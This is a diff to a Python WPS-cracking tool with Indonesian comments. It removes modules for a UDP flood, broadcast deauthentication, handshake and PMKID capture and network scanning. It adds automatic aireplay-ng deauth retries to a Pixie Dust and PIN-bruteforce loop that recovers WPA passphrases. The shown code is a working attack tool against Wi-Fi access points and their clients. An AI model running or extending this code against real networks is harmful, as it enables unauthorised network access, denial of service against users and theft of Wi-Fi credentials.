@@ -353,82 +353,6 @@ class PixiewpsData:
             pixiecmd += ' --force'
         return pixiecmd
 
-class NetworkAuditor:
-    def __init__(self, target_ip, port, duration):
-        self.target_ip = target_ip
-        self.port = port
-        self.duration = duration
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        self.payload = b"A" * 1024
-
-    def run_stress_test(self):
-        end_time = time.time() + self.duration
-        packets_sent = 0
-        while time.time() < end_time:
-            try:
-                self.sock.sendto(self.payload, (self.target_ip, self.port))
-                packets_sent += 1
-            except Exception:
-                pass
-        print(f"Stress test selesai. Total paket dikirim: {packets_sent}")
-
-class HandshakeCatcher:
-    def __init__(self, interface, bssid, channel):
-        self.interface = interface
-        self.bssid = bssid
-        self.channel = channel
-
-    def capture(self):
-        cmd = f"airodump-ng -c {self.channel} --bssid {self.bssid} -w capture {self.interface}"
-        print(f"Menjalankan penangkapan handshake pada {self.bssid}")
-        try:
-            subprocess.run(cmd, shell=True)
-        except KeyboardInterrupt:
-            print("Penangkapan dihentikan.")
-
-class DeauthAttacker:
-    def __init__(self, interface, bssid, client_mac, count):
-        self.interface = interface
-        self.bssid = bssid
-        self.client_mac = client_mac
-        self.count = count
-
-    def attack(self):
-        cmd = f"aireplay-ng --deauth {self.count} -a {self.bssid} -c {self.client_mac} {self.interface}"
-        print(f"Mengirim serangan deauth ke {self.client_mac} dari AP {self.bssid}")
-        try:
-            subprocess.run(cmd, shell=True)
-        except KeyboardInterrupt:
-            print("Serangan deauth dihentikan")
-
-class NetworkMapper:
-    def __init__(self, ip_range):
-        self.ip_range = ip_range
-
-    def scan(self):
-        cmd = f"nmap -sn {self.ip_range}"
-        print(f"Memindai topologi jaringan: {self.ip_range}")
-        try:
-            subprocess.run(cmd, shell=True)
-        except KeyboardInterrupt:
-            print("Pemindaian dihentikan")
-
-class PMKIDCatcher:
-    def __init__(self, interface, bssid):
-        self.interface = interface
-        self.bssid = bssid
-        self.target_file = "target_ap.txt"
-
-    def capture(self):
-        with open(self.target_file, 'w') as f:
-            f.write(self.bssid.replace(':', '') + '\n')
-        cmd = f"hcxdumptool -i {self.interface} -o pmkid_capture.pcapng --filterlist_ap={self.target_file} --filtermode=2 --enable_status=1"
-        print(f"Menjalankan penangkapan PMKID pada {self.bssid}")
-        try:
-            subprocess.run(cmd, shell=True)
-        except KeyboardInterrupt:
-            print("Penangkapan PMKID dihentikan")
-
 
 class ConnectionStatus:
     def __init__(self):
@@ -479,10 +403,12 @@ class BruteforceStatus:
 
 class Companion:
     """Main application part"""
-    def __init__(self, interface, save_result=False, print_debug=False):
+    def __init__(self, interface, save_result=False, print_debug=False, max_deauth_retries=3):
         self.interface = interface
         self.save_result = save_result
         self.print_debug = print_debug
+        self.max_deauth_retries = max_deauth_retries
+        self.deauth_retries = 0
 
         self.tempdir = tempfile.mkdtemp()
         with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
@@ -660,6 +586,20 @@ class Companion:
                         pin = "''"
                     return pin
         return False
+        
+    def _send_deauth(self, bssid):
+        if not shutil.which('aireplay-ng'):
+            print("[!] 'aireplay-ng' tidak ditemukan. Install aircrack-ng untuk fitur deauth.")
+            return False
+        print(f"[*] Mengirim deauth ke {bssid} untuk mereset WPS...")
+        cmd = f"aireplay-ng -0 1 -a {bssid} {self.interface}"
+        try:
+            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
+            time.sleep(2)  # tunggu AP mereset
+            return True
+        except subprocess.CalledProcessError:
+            print("[!] Gagal mengirim deauth.")
+            return False
 
     def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
         print(f"[+] WPS PIN: '{wps_pin}'")
@@ -755,64 +695,90 @@ class Companion:
         self.sendOnly('WPS_CANCEL')
         return False
 
-    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
-                          pixieforce=False, store_pin_on_fail=False):
-        if not pin:
-            if pixiemode:
-                try:
-                    # Try using the previously calculated PIN
-                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
-                    with open(filename, 'r') as file:
-                        t_pin = file.readline().strip()
-                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
-                            pin = t_pin
-                        else:
-                            raise FileNotFoundError
-                except FileNotFoundError:
-                    pin = self.generator.getLikely(bssid) or '12345670'
-            elif not pbc_mode:
-                # If not pixiemode, ask user to select a pin from the list
-                pin = self.__prompt_wpspin(bssid) or '12345670'
-        if pbc_mode:
-            self.__wps_connection(bssid, pbc_mode=pbc_mode)
-            bssid = self.connection_status.bssid
-            pin = '<PBC mode>'
-        elif store_pin_on_fail:
-            try:
-                self.__wps_connection(bssid, pin, pixiemode)
-            except KeyboardInterrupt:
-                print("\nAborting…")
-                self.__savePin(bssid, pin)
-                return False
-        else:
-            self.__wps_connection(bssid, pin, pixiemode)
+    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False,
+                      showpixiecmd=False, pixieforce=False, store_pin_on_fail=False):
+        # Reset counter retry untuk target baru
+        self.deauth_retries = 0
 
-        if self.connection_status.status == 'GOT_PSK':
-            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
-            if self.save_result:
-                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
-            if not pbc_mode:
-                # Try to remove temporary PIN file
-                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
+        while True:
+            # Jika pin belum ditentukan dan dalam mode pixie, coba ambil dari file atau generate
+            if not pin:
+                if pixiemode:
+                    try:
+                        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
+                        with open(filename, 'r') as file:
+                            t_pin = file.readline().strip()
+                            if input('[?] Gunakan PIN yang sudah dihitung sebelumnya {}? [n/Y] '.format(t_pin)).lower() != 'n':
+                                pin = t_pin
+                            else:
+                                raise FileNotFoundError
+                    except FileNotFoundError:
+                        pin = self.generator.getLikely(bssid) or '12345670'
+                elif not pbc_mode:
+                    pin = self.__prompt_wpspin(bssid) or '12345670'
+
+            if pbc_mode:
+                self.__wps_connection(bssid, pbc_mode=pbc_mode)
+                bssid = self.connection_status.bssid
+                pin = '<PBC mode>'
+            elif store_pin_on_fail:
                 try:
-                    os.remove(filename)
-                except FileNotFoundError:
-                    pass
-            return True
-        elif pixiemode:
-            if self.pixie_creds.got_all():
-                pin = self.__runPixiewps(showpixiecmd, pixieforce)
-                if pin:
-                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
-                return False
+                    self.__wps_connection(bssid, pin, pixiemode)
+                except KeyboardInterrupt:
+                    print("\nMembatalkan…")
+                    self.__savePin(bssid, pin)
+                    return False
             else:
-                print('[!] Not enough data to run Pixie Dust attack')
+                self.__wps_connection(bssid, pin, pixiemode)
+
+            # Cek hasil
+            if self.connection_status.status == 'GOT_PSK':
+                self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
+                if self.save_result:
+                    self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
+                if not pbc_mode:
+                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
+                    try:
+                        os.remove(filename)
+                    except FileNotFoundError:
+                        pass
+                return True
+
+            # Jika Pixie Dust dan data lengkap, jalankan pixiewps
+            elif pixiemode and self.pixie_creds.got_all():
+                new_pin = self.__runPixiewps(showpixiecmd, pixieforce)
+                if new_pin:
+                    # Ubah mode menjadi non-pixie dan ulangi loop dengan pin baru
+                    pixiemode = False
+                    pin = new_pin
+                    self.deauth_retries = 0
+                    continue
+                else:
+                    print('[!] Pixiewps gagal mendapatkan PIN.')
+                    return False
+
+            # Jika terjadi NACK atau FAIL dan deauth diaktifkan
+            elif self.connection_status.status in ('WSC_NACK', 'WPS_FAIL') and self.max_deauth_retries > 0:
+                if self.deauth_retries < self.max_deauth_retries:
+                    self.deauth_retries += 1
+                    print(f"[*] Percobaan deauth ke-{self.deauth_retries}/{self.max_deauth_retries}...")
+                    if self._send_deauth(bssid):
+                        print("[*] Mencoba ulang dengan PIN yang sama setelah deauth.")
+                        self.connection_status.clear()
+                        continue
+                    else:
+                        print("[!] Deauth gagal, hentikan retry.")
+                        return False
+                else:
+                    print("[-] Batas percobaan deauth tercapai. PIN mungkin salah atau AP terkunci permanen.")
+                    if store_pin_on_fail:
+                        self.__savePin(bssid, pin)
+                    return False
+            else:
+                # Kegagalan lain (misal WPS_FAIL tanpa lock)
+                if store_pin_on_fail:
+                    self.__savePin(bssid, pin)
                 return False
-        else:
-            if store_pin_on_fail:
-                # Saving Pixiewps calculated PIN if can't connect
-                self.__savePin(bssid, pin)
-            return False
 
     def __first_half_bruteforce(self, bssid, f_half, delay=None):
         """
@@ -1240,61 +1206,6 @@ if __name__ == '__main__':
         '-r', '--reverse-scan',
         action='store_true',
         help='Reverse order of networks in the list of networks. Useful on small displays'
-        
-    )
-    parser.add_argument(
-        '--stress-target',
-        type=str,
-        help='Target IP untuk network stress test'
-    )
-    parser.add_argument(
-        '--stress-port',
-        type=int,
-        default=80,
-        help='Target port untuk network stress test'
-    )
-    parser.add_argument(
-        '--stress-duration',
-        type=int,
-        default=10,
-        help='Durasi stress test dalam detik'
-    )
-    parser.add_argument(
-        '--capture-handshake',
-        action='store_true',
-        help='Tangkap WPA handshake'
-    )
-    parser.add_argument(
-        '-c', '--channel',
-        type=int,
-        help='Channel AP untuk penangkapan'
-    )
-    parser.add_argument(
-        '--deauth',
-        action='store_true',
-        help='Kirim serangan deauthentication'
-    )
-    parser.add_argument(
-        '--client-mac',
-        type=str,
-        default='FF:FF:FF:FF:FF:FF',
-        help='Target MAC address untuk deauth'
-    )
-    parser.add_argument(
-        '--deauth-count',
-        type=int,
-        default=10,
-        help='Jumlah paket deauth yang dikirim'
-    )
-    parser.add_argument(
-        '--map-network',
-        type=str,
-        help='Pindai subnet jaringan'
-    )
-    parser.add_argument(
-        '--capture-pmkid',
-        action='store_true',
-        help='Tangkap PMKID tanpa client'
     )
     parser.add_argument(
         '--mtk-wifi',
@@ -1302,6 +1213,13 @@ if __name__ == '__main__':
         help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
              '(for internal Wi-Fi adapters implemented in MediaTek SoCs). '
              'Turn off Wi-Fi in the system settings before using this.'
+    )
+    parser.add_argument(
+        '--deauth-attempts',
+        type=int,
+        default=3,
+        help='Number of deauth attempts on WPS lock detection (default 3, 0 to disable)'
+    
     )
     parser.add_argument(
         '-v', '--verbose',
@@ -1315,33 +1233,6 @@ if __name__ == '__main__':
         die("The program requires Python 3.6 and above")
     if os.getuid() != 0:
         die("Run it as root")
-        
-    if args.stress_target:
-        print(f"Memulai stress test ke {args.stress_target}:{args.stress_port} selama {args.stress_duration} detik")
-        auditor = NetworkAuditor(args.stress_target, args.stress_port, args.stress_duration)
-        auditor.run_stress_test()
-        sys.exit(0)
-
-    if args.capture_handshake and args.bssid and args.channel:
-        catcher = HandshakeCatcher(args.interface, args.bssid, args.channel)
-        catcher.capture()
-        sys.exit(0)
-
-    if args.deauth and args.bssid:
-        attacker = DeauthAttacker(args.interface, args.bssid, args.client_mac, args.deauth_count)
-        attacker.attack()
-        sys.exit(0)
-
-    if args.map_network:
-        mapper = NetworkMapper(args.map_network)
-        mapper.scan()
-        sys.exit(0)
-
-    if args.capture_pmkid and args.bssid:
-        pmkid = PMKIDCatcher(args.interface, args.bssid)
-        pmkid.capture()
-        sys.exit(0)
-
 
     if args.mtk_wifi:
         wmtWifi_device = Path("/dev/wmtWifi")
@@ -1356,7 +1247,8 @@ if __name__ == '__main__':
 
     while True:
         try:
-            companion = Companion(args.interface, args.write, print_debug=args.verbose)
+            companion = Companion(args.interface, args.write, print_debug=args.verbose,
+                                  max_deauth_retries=args.deauth_attempts)
             if args.pbc:
                 companion.single_connection(pbc_mode=True)
             else:
@@ -1372,7 +1264,8 @@ if __name__ == '__main__':
                     args.bssid = scanner.prompt_network()
 
                 if args.bssid:
-                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                    companion = Companion(args.interface, args.write, print_debug=args.verbose,
+                                          max_deauth_retries=args.deauth_attempts)
                     if args.bruteforce:
                         companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                     else:
